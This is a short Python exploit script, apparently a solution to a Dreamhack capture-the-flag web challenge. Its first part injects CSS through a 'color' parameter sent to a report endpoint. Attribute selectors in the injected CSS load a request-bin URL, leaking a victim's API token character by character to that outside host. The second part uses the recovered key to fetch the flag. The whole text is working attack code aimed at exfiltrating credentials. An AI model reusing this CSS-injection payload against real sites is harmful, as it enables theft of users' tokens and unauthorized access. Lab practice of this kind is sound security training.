# 1. Extract API-KEY
import requests, string

port = 8784
url = f'http://host3.dreamhack.games:{port}/report'
bin = 'https://aqzpgxt.request.dreamhack.games'

for char in string.ascii_lowercase:
    path = f"mypage?color=blue;}} input[id=InputApitoken][value^=yqudrjcgjskfrvqs{char}] {{background:url({bin})"

    res = requests.post(url, data={'path': path})
    print(char, res.status_code)


# 2. Get flag
import requests

port = 8784
url = f"http://host3.dreamhack.games:{port}/api/memo"
headers = {'API-KEY': 'yqudrjcgjskfrvqs'}
res = requests.get(url, headers=headers)
print(res.text)
